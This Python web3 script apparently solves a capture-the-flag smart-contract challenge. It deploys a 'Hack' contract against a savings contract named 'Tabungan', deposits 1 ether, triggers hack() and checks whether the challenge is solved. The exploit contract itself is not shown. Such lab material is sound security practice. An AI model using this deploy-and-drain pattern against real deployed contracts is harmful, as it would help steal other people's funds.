import os

import solcx
from web3 import HTTPProvider, Web3

# RPC_URL = . . .
# PRIVKEY = . . .
# SETUP_CONTRACT_ADDR = . . .

solcx.install_solc("0.8.20")
solcx.set_solc_version("0.8.20")


class Account:
    def __init__(self) -> None:
        self.w3 = Web3(HTTPProvider(RPC_URL))
        self.w3.eth.default_account = self.w3.eth.account.from_key(PRIVKEY).address
        self.account_address = self.w3.eth.default_account

    def get_balance(s, addr):
        print("balance:", s.w3.eth.get_balance(addr))


class BaseContractProps:
    def __init__(self, path: str) -> None:
        file, klass = path.split(":")
        self.__file = os.path.abspath(file)
        self.path = f"{self.__file}:{klass}"

    @property
    def abi(self):
        klass = solcx.compile_files(self.__file, output_values=["abi"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]["abi"]
        raise Exception("class not found")

    @property
    def bin(self):
        klass = solcx.compile_files(self.__file, output_values=["bin"])
        for klas in klass:
            if klas in self.path:
                return klass[klas]["bin"]
        raise Exception("class not found")


class BaseDeployedContract(Account, BaseContractProps):
    def __init__(self, addr, file, abi=None) -> None:
        BaseContractProps.__init__(self, file)
        Account.__init__(self)
        self.address = addr
        if abi:
            self.contract = self.w3.eth.contract(addr, abi=abi)
        else:
            self.contract = self.w3.eth.contract(addr, abi=self.abi)


class BaseUndeployedContract(Account, BaseContractProps):
    def __init__(self, path) -> None:
        BaseContractProps.__init__(self, path)
        Account.__init__(self)
        self.contract = self.w3.eth.contract(abi=self.abi, bytecode=self.bin)

    def deploy_to_target(self, target):
        tx_hash = self.contract.constructor(target).transact()
        tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
        return BaseDeployedContract(tx_receipt.contractAddress, self.path)


class SetupContract(BaseDeployedContract):
    def __init__(self) -> None:
        BaseContractProps.__init__(self, "./Setup.sol:Setup")
        Account.__init__(self)
        self.address = SETUP_CONTRACT_ADDR
        # contract has constructor
        self.contract = self.w3.eth.contract(self.address, abi=self.abi)

    def target(self):
        return self.contract.functions.TARGET().call()

    def is_solved(s):
        result = s.contract.functions.isSolved().call()
        print("is solved:", result)


class ChallContract(BaseDeployedContract):
    def __init__(self, addr) -> None:
        super().__init__(addr, "./Tabungan.sol:Tabungan")

    def get_balance(self, addr):
        balance = self.contract.functions.balances(addr).call()
        print("balance:", balance)

    def setor(self, value: str):
        transaction = {
            "from": self.account_address,
            "gas": 1000000,
            "gasPrice": self.w3.eth.gas_price,
            "nonce": self.w3.eth.get_transaction_count(self.account_address),
            "value": value,
        }
        self.contract.functions.setor().transact(transaction)

    def ambil(self):
        self.contract.functions.ambil().transact()

    def check_tokens(self):
        token = self.contract.functions.tokens(self.account_address).call()
        print("token:", token)


class HackContract(BaseUndeployedContract):
    def __init__(self) -> None:
        super().__init__("./Hack.sol:Hack")


if __name__ == "__main__":
    setup = SetupContract()
    target = setup.target()
    chall = ChallContract(target)
    hack = HackContract().deploy_to_target(target)
    tx = hack.contract.functions.setor().transact({"value": 1000000000000000000})
    hack.contract.functions.hack().transact()
    chall.get_balance(hack.contract.address)
    setup.is_solved()
